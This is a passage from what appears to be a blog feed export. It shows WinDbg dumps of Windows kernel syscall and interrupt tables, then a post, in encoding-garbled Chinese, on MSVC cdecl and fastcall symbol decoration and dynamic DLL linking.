fffff802527cd3e0 - nt!NtThawTransactions (fffff802&#96;527cd3e0)
fffff80252a8d1c0 - nt!NtTraceControl (fffff802&#96;52a8d1c0)
fffff80252d526b0 - nt!NtTranslateFilePath (fffff802&#96;52d526b0)
fffff80252cbabd0 - nt!NtUmsThreadYield (fffff802&#96;52cbabd0)
fffff80252c984e0 - nt!NtUnloadDriver (fffff802&#96;52c984e0)
fffff80252a4f480 - nt!NtUnloadKey (fffff802&#96;52a4f480)
fffff80252b60b20 - nt!NtUnloadKey2 (fffff802&#96;52b60b20)
fffff80252a4f7e0 - nt!NtUnloadKeyEx (fffff802&#96;52a4f7e0)
fffff80252adea50 - nt!NtUnlockFile (fffff802&#96;52adea50)
fffff80252656660 - nt!NtUnlockVirtualMemory (fffff802&#96;52656660)
fffff80252a00720 - nt!NtUnmapViewOfSectionEx (fffff802&#96;52a00720)
fffff80252a20290 - nt!NtUnsubscribeWnfStateChange (fffff802&#96;52a20290)
fffff80252a221d0 - nt!NtUpdateWnfStateData (fffff802&#96;52a221d0)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252adf1e0 - nt!NtWaitForAlertByThreadId (fffff802&#96;52adf1e0)
fffff80252c836c0 - nt!NtWaitForDebugEvent (fffff802&#96;52c836c0)
fffff80252d582f0 - nt!NtWaitForKeyedEvent (fffff802&#96;52d582f0)
fffff8025260ff10 - nt!NtWaitForWorkViaWorkerFactory (fffff802&#96;5260ff10)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff802529c73b0 - nt!NtLoadKey3 (fffff802&#96;529c73b0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="IDT-interrupt-descriptor-table"><a href="#IDT-interrupt-descriptor-table" class="headerlink" title="IDT (interrupt descriptor table)"></a>IDT (interrupt descriptor table)</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lkd&gt; !idt

Dumping IDT: fffff8025075f000

00:	fffff80252e12100 nt!KiDivideErrorFaultShadow
01:	fffff80252e12180 nt!KiDebugTrapOrFaultShadow	Stack &#x3D; 0xFFFFF802507639D0
02:	fffff80252e12240 nt!KiNmiInterruptShadow	Stack &#x3D; 0xFFFFF802507637D0
03:	fffff80252e122c0 nt!KiBreakpointTrapShadow
04:	fffff80252e12340 nt!KiOverflowTrapShadow
05:	fffff80252e123c0 nt!KiBoundFaultShadow
06:	fffff80252e12440 nt!KiInvalidOpcodeFaultShadow
07:	fffff80252e124c0 nt!KiNpxNotAvailableFaultShadow
08:	fffff80252e12540 nt!KiDoubleFaultAbortShadow	Stack &#x3D; 0xFFFFF802507633D0
09:	fffff80252e125c0 nt!KiNpxSegmentOverrunAbortShadow
0a:	fffff80252e12640 nt!KiInvalidTssFaultShadow
0b:	fffff80252e126c0 nt!KiSegmentNotPresentFaultShadow
0c:	fffff80252e12740 nt!KiStackFaultShadow
0d:	fffff80252e127c0 nt!KiGeneralProtectionFaultShadow
0e:	fffff80252e12840 nt!KiPageFaultShadow
10:	fffff80252e128c0 nt!KiFloatingErrorFaultShadow
11:	fffff80252e12940 nt!KiAlignmentFaultShadow
12:	fffff80252e129c0 nt!KiMcheckAbortShadow	Stack &#x3D; 0xFFFFF802507635D0
13:	fffff80252e12ac0 nt!KiXmmExceptionShadow
14:	fffff80252e12b40 nt!KiVirtualizationExceptionShadow
15:	fffff80252e12bc0 nt!KiControlProtectionFaultShadow
1f:	fffff80252e12c40 nt!KiApcInterruptShadow
20:	fffff80252e12cc0 nt!KiSwInterruptShadow
29:	fffff80252e12d40 nt!KiRaiseSecurityCheckFailureShadow
2c:	fffff80252e12dc0 nt!KiRaiseAssertionShadow
2d:	fffff80252e12e40 nt!KiDebugServiceTrapShadow
2e:	fffff80252e12ec0 nt!KiSystemServiceShadow
2f:	fffff80252e12f40 nt!KiDpcInterruptShadow
30:	fffff80252e12fc0 nt!KiHvInterruptShadow
31:	fffff80252e13040 nt!KiVmbusInterrupt0Shadow
32:	fffff80252e130c0 nt!KiVmbusInterrupt1Shadow
33:	fffff80252e13140 nt!KiVmbusInterrupt2Shadow
34:	fffff80252e131c0 nt!KiVmbusInterrupt3Shadow
35:	fffff80252e13468 nt!HalpInterruptCmciService (KINTERRUPT fffff802530f2ec0)

36:	fffff80252e13470 nt!HalpInterruptCmciService (KINTERRUPT fffff802530f3100)

50:	fffff80252e13540 0xfffff80256624d20 (KINTERRUPT ffff81814970dc80)

51:	fffff80252e13548 0xfffff80256a0fd30 (KINTERRUPT ffff81814970d3c0)

52:	fffff80252e13550 0xfffff802577c7960 (KINTERRUPT ffff818148521a00)

53:	fffff80252e13558 0xfffff802561d3c30 (KINTERRUPT ffff818148521c80)

60:	fffff80252e135c0 0xfffff8026cce6790 (KINTERRUPT ffff81814970d000)

61:	fffff80252e135c8 0xfffff80256a0fd30 (KINTERRUPT ffff81814970d500)

62:	fffff80252e135d0 0xfffff802577c7960 (KINTERRUPT ffff8181485218c0)

63:	fffff80252e135d8 0xfffff802561d3c30 (KINTERRUPT ffff818148521780)

71:	fffff80252e13648 0xfffff80256a0fd30 (KINTERRUPT ffff81814970d640)

72:	fffff80252e13650 0xfffff80263a0d850 (KINTERRUPT ffff818148521280)

81:	fffff80252e136c8 0xfffff80256623bb0 (KINTERRUPT ffff81814970d780)

82:	fffff80252e136d0 0xfffff802561d3c30 (KINTERRUPT ffff818148521dc0)

83:	fffff80252e136d8 0xfffff80263a0d850 (KINTERRUPT ffff818148521140)

91:	fffff80252e13748 0xfffff80256624d20 (KINTERRUPT ffff81814970d8c0)

93:	fffff80252e13758 0xfffff802561d3c30 (KINTERRUPT ffff818148521500)

	                 0xfffff802561d3c30 (KINTERRUPT ffff818148521000)

a0:	fffff80252e137c0 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7dc0)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7c80)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7b40)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7a00)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f78c0)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7780)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7640)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7500)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f73c0)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7280)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7140)

	                 0xfffff802561d3c30 (KINTERRUPT ffff81814a4f7000)

a1:	fffff80252e137c8 0xfffff80256624d20 (KINTERRUPT ffff81814970da00)

a2:	fffff80252e137d0 0xfffff80256a0fd30 (KINTERRUPT ffff81814970d140)

a3:	fffff80252e137d8 0xfffff802561d3c30 (KINTERRUPT ffff818148521640)

b0:	fffff80252e13840 0xfffff802564f5c40 (KINTERRUPT ffff81814970ddc0)

b1:	fffff80252e13848 0xfffff80256624d20 (KINTERRUPT ffff81814970db40)

b2:	fffff80252e13850 0xfffff80256a0fd30 (KINTERRUPT ffff81814970d280)

b3:	fffff80252e13858 0xfffff802561d3c30 (KINTERRUPT ffff818148521b40)

cd:	fffff80252e13928 nt!HalpInterruptThermalService (KINTERRUPT ffff91870a51a500)

d1:	fffff80252e13948 nt!HalpTimerClockInterrupt (KINTERRUPT fffff802530f38e0)

d2:	fffff80252e13950 nt!HalpTimerClockIpiRoutine (KINTERRUPT fffff802530f37c0)

d7:	fffff80252e13978 nt!HalpInterruptRebootService (KINTERRUPT fffff802530f3580)

d8:	fffff80252e13980 nt!HalpInterruptStubService (KINTERRUPT fffff802530f3340)

df:	fffff80252e139b8 nt!HalpInterruptSpuriousService (KINTERRUPT fffff802530f3220)

e1:	fffff80252e13240 nt!KiIpiInterruptShadow
e2:	fffff80252e139d0 nt!HalpInterruptLocalErrorService (KINTERRUPT fffff802530f3460)

e3:	fffff80252e139d8 nt!HalpInterruptDeferredRecoveryService (KINTERRUPT fffff802530f2fe0)

fe:	fffff80252e13ab0 nt!HalpPerfInterrupt (KINTERRUPT fffff802530f36a0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>ç•™å‘</tag>
        <tag>Hacking</tag>
        <tag>DLL hook</tag>
      </tags>
  </entry>
  <entry>
    <title>CALL_CONVENTION</title>
    <url>/2021/04/15/call_convention/</url>
    <content><![CDATA[<h1 id="CALL-CONVENTION"><a href="#CALL-CONVENTION" class="headerlink" title="CALL_CONVENTION"></a>CALL_CONVENTION</h1><h2 id="MSVC"><a href="#MSVC" class="headerlink" title="MSVC"></a>MSVC</h2><p>ä¸ºäº†è®©ä¸¤ä¸ªä¸åŒè°ƒç”¨çº¦å®šçš„èƒ½å¤Ÿäº’ç›¸è°ƒç”¨ï¼Œç”±äºä¸åŒè°ƒç”¨çº¦å®šå¯¹äºç¬¦å·çš„ä¸åŒä¿®é¥°ï¼Œæˆ‘é€‰æ‹©ä½¿ç”¨ dll æ‰‹åŠ¨ä¿®æ”¹å¯¼å…¥ç¬¦å·ï¼Œé˜²æ­¢ç¬¦å·é”™ä¹±çš„é—®é¢˜ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« ä»‹ç»äº† MSVC ä¸‹å„ç§è°ƒç”¨çº¦å®šã€‚åŒä¸€ç§è°ƒç”¨çº¦å®šåœ¨ä¸åŒæŒ‡ä»¤é›†æ¶æ„ä¸‹ä¹Ÿæ˜¯æœ‰åŒºåˆ«çš„ã€‚<br><a href="https://docs.microsoft.com/en-us/cpp/build/reference/gd-gr-gv-gz-calling-convention?view=msvc-160">https://docs.microsoft.com/en-us/cpp/build/reference/gd-gr-gv-gz-calling-convention?view=msvc-160</a><br>å…¶ä¸­æœ‰ä¸€ä¸ª vectorcall ä¼¼ä¹æ˜¯ä¸ºäº†ä¼˜åŒ–è€Œä½¿ç”¨çš„ã€‚</p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//CdeclCall.c</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token comment">//__declspec(dllexport) </span>
<span class="token keyword">void</span>  __cdecl <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d , b = %d "</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//FastCall.c</span>
<span class="token function">__declspec</span><span class="token punctuation">(</span>dllimport<span class="token punctuation">)</span> <span class="token keyword">void</span> __fastcall <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>æˆ‘ä»¬å…ˆçœ‹çœ‹ FastCall.c ç¼–è¯‘å‡ºæ¥çš„ç¬¦å·æ˜¯ä»€ä¹ˆå½¢å¼çš„ã€‚</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">cl <span class="token operator">/</span>c CdeclCall<span class="token punctuation">.</span>c
dumpbin <span class="token operator">/</span>SYMBOLS CdeclCall<span class="token punctuation">.</span>obj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p>ä»¥ä¸‹æ˜¯ç»“æœ</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">Microsoft <span class="token punctuation">(</span>R<span class="token punctuation">)</span> COFF/PE Dumper Version 14<span class="token punctuation">.</span>28<span class="token punctuation">.</span>29913<span class="token punctuation">.</span>0
Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> Microsoft Corporation<span class="token punctuation">.</span>  All rights reserved<span class="token punctuation">.</span>


Dump of file CdeclCall<span class="token punctuation">.</span>obj

File <span class="token function">Type</span>: COFF OBJECT

COFF SYMBOL TABLE
000 010474D9 ABS    notype       Static       <span class="token punctuation">|</span> @comp<span class="token punctuation">.</span>id
001 80010191 ABS    notype       Static       <span class="token punctuation">|</span> @feat<span class="token punctuation">.</span>00
002 00000000 SECT1  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>drectve
    Section length   2F<span class="token punctuation">,</span> <span class="token comment">#relocs    0, #linenums    0, checksum        0</span>
004 00000000 SECT2  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>debug<span class="token variable">$S</span>
    Section length   88<span class="token punctuation">,</span> <span class="token comment">#relocs    0, #linenums    0, checksum        0</span>
006 00000000 SECT3  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>text<span class="token variable">$mn</span>
    Section length   1A<span class="token punctuation">,</span> <span class="token comment">#relocs    2, #linenums    0, checksum 7C27059A</span>
008 00000000 SECT4  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>text<span class="token variable">$mn</span>
    Section length    A<span class="token punctuation">,</span> <span class="token comment">#relocs    1, #linenums    0, checksum 71A05264, selection    2 (pick any)</span>
00A 00000000 SECT5  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>text<span class="token variable">$mn</span>
    Section length   29<span class="token punctuation">,</span> <span class="token comment">#relocs    2, #linenums    0, checksum 2B25B17F, selection    2 (pick any)</span>
00C 00000000 SECT6  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>text<span class="token variable">$mn</span>
    Section length   3A<span class="token punctuation">,</span> <span class="token comment">#relocs    2, #linenums    0, checksum CAE6D625, selection    2 (pick any)</span>
00E 00000000 SECT4  notype <span class="token punctuation">(</span><span class="token punctuation">)</span>    External     <span class="token punctuation">|</span> ___local_stdio_printf_options
00F 00000000 UNDEF  notype <span class="token punctuation">(</span><span class="token punctuation">)</span>    External     <span class="token punctuation">|</span> ___acrt_iob_func
010 00000000 UNDEF  notype <span class="token punctuation">(</span><span class="token punctuation">)</span>    External     <span class="token punctuation">|</span> ___stdio_common_vfprintf
011 00000000 SECT5  notype <span class="token punctuation">(</span><span class="token punctuation">)</span>    External     <span class="token punctuation">|</span> __vfprintf_l
012 00000000 SECT6  notype <span class="token punctuation">(</span><span class="token punctuation">)</span>    External     <span class="token punctuation">|</span> _printf
013 00000000 SECT3  notype <span class="token punctuation">(</span><span class="token punctuation">)</span>    External     <span class="token punctuation">|</span> _foo
014 00000008 UNDEF  notype       External     <span class="token punctuation">|</span> ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 <span class="token punctuation">(</span>`__local_stdio_printf_options<span class="token string">'::`2'</span>::_OptionsStorage<span class="token punctuation">)</span>
015 00000000 SECT7  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span><span class="token keyword">data</span>
    Section length   11<span class="token punctuation">,</span> <span class="token comment">#relocs    0, #linenums    0, checksum A358B0F1</span>
017 00000000 SECT7  notype       Static       <span class="token punctuation">|</span> <span class="token variable">$SG9219</span>
018 00000000 SECT8  notype       Static       <span class="token punctuation">|</span> <span class="token punctuation">.</span>chks64
    Section length   40<span class="token punctuation">,</span> <span class="token comment">#relocs    0, #linenums    0, checksum        0</span>

String Table Size = 0x90 bytes

  Summary

          40 <span class="token punctuation">.</span>chks64
          11 <span class="token punctuation">.</span><span class="token keyword">data</span>
          88 <span class="token punctuation">.</span>debug<span class="token variable">$S</span>
          2F <span class="token punctuation">.</span>drectve
          87 <span class="token punctuation">.</span>text<span class="token variable">$mn</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>å¯ä»¥çœ‹è§åœ¨ MSVC cdecl ä¸‹ foo åªæ˜¯è¢«ç®€å•ä¿®é¥°æˆä¸ºäº† _fooï¼Œ</p>
<p>ä½†æ˜¯å½“æˆ‘ä»¬ç”¨åŒæ ·çš„æ–¹æ³•å»æŸ¥çœ‹ fastcall ä¿®é¥°çš„ foo æ—¶ï¼Œä¼šå‘ç°å‡ºç°äº†ä¸€äº›å˜åŒ–ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">@foo@8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>å¾ˆæ˜æ˜¾è¿™ä¸¤ä¸ªä¸èƒ½é“¾æ¥ã€‚ç”±æ­¤è¦æœ‰ä¸€äº›æ‰‹åŠ¨çš„æ“ä½œï¼Œé…ç½®ç¬¦å·ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">LIBRARY CdeclCall
EXPORTS
    foo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">cl .\CdeclCall.c &#x2F;LD &#x2F;DEF .\together.def<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æœ€å</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">link <span class="token punctuation">.</span>\FastCall<span class="token punctuation">.</span>obj <span class="token punctuation">.</span>\CdeclCall<span class="token punctuation">.</span>lib<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>å¾—åˆ°ä¸€ä¸ªç¥é­”ç©æ„å„¿</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> D:\Learn_Linker_elf_rtld\call_invention> D:\Learn_Linker_elf_rtld\call_invention\FastCall<span class="token punctuation">.</span>exe
<span class="token function">PS</span> D:\Learn_Linker_elf_rtld\call_invention><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p>æ‰§è¡Œä¸äº†ï¼Œida çœ‹çœ‹ï¼Œç¨‹åºä¸Šå¥½åƒæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œå¯èƒ½åŸå› åœ¨åŠ¨æ€é“¾æ¥å™¨ï¼Ÿ<strong>ç•™å‘ã€‚ã€‚ã€‚</strong></p>
<h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><p>è¿˜æœ‰ä¸€ç§æ˜¾ç¤ºçš„åŠ¨æ€é“¾æ¥ï¼Œè¿˜æ²¡è¯•è¿‡ï¼Œå¯ä»¥å°è¯•ä¸€æ³¢ã€‚</p>
<p>å»å®˜ç½‘æ‰¾äº†ä¸€ä¸ª æ˜¾ç¤ºåŠ¨æ€é“¾æ¥çš„æ¨¡æ¿ï¼Œä¿®æ”¹åæœ‰ä»¥ä¸‹ç»“æœã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span> </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span> </span>
 
<span class="token comment">//typedef int (__cdecl *MYPROC)(LPWSTR); </span>

<span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>MYPROC<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    HINSTANCE hinstLib<span class="token punctuation">;</span> 
    MYPROC foo<span class="token punctuation">;</span> 
    BOOL fFreeResult<span class="token punctuation">,</span> fRunTimeLinkSuccess <span class="token operator">=</span> FALSE<span class="token punctuation">;</span> 
 
    <span class="token comment">// Get a handle to the DLL module.</span>
 
    hinstLib <span class="token operator">=</span> <span class="token function">LoadLibrary</span><span class="token punctuation">(</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"CdeclCall.dll"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 
    <span class="token comment">// If the handle is valid, try to get the function address.</span>
 
    <span class="token keyword">if</span> <span class="token punctuation">(</span>hinstLib <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> 
    <span class="token punctuation">&#123;</span> 
        foo <span class="token operator">=</span> <span class="token punctuation">(</span>MYPROC<span class="token punctuation">)</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hinstLib<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 
        <span class="token comment">// If the function address is valid, call the function.</span>
 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">!=</span> foo<span class="token punctuation">)</span> 
        <span class="token punctuation">&#123;</span>
            fRunTimeLinkSuccess <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>
            <span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// Free the DLL module.</span>
 
        fFreeResult <span class="token operator">=</span> <span class="token function">FreeLibrary</span><span class="token punctuation">(</span>hinstLib<span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 

    <span class="token comment">// If unable to call the DLL function, use an alternative.</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> fRunTimeLinkSuccess<span class="token punctuation">)</span> 
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Message printed from executable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ç”¨ together.def CdeclCall.c ç¼–è¯‘å‡º CdeclCall.dll</p>
<p>è¿è¡Œ<br>æœ‰å¦‚ä¸‹ç»“æœ</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> D:\Learn_Linker_elf_rtld\call_invention> <span class="token punctuation">.</span>\D_FastCall<span class="token punctuation">.</span>exe
a = 608420 <span class="token punctuation">,</span> b = 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p>é¢„æœŸä¹‹ä¸­ã€‚å¥½åƒå­¦åˆ°äº†äº›ä»€ä¹ˆã€‚2333</p>
<h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p><strong>ç•™å‘ã€‚ã€‚ã€‚</strong></p>
<p>ld çš„è„šæœ¬éº»çƒ¦ä¸€ç‚¹ï¼Œä¸è¿‡èµ„æ–™åº”è¯¥å¤šä¸€ç‚¹ã€‚</p>
]]></content>
      <categories>
        <category>call convention</category>
      </categories>
      <tags>
        <tag>MSVC</tag>
        <tag>call convention</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME-FINAL-RE</title>
    <url>/2021/03/21/HGAME_FINAL/</url>
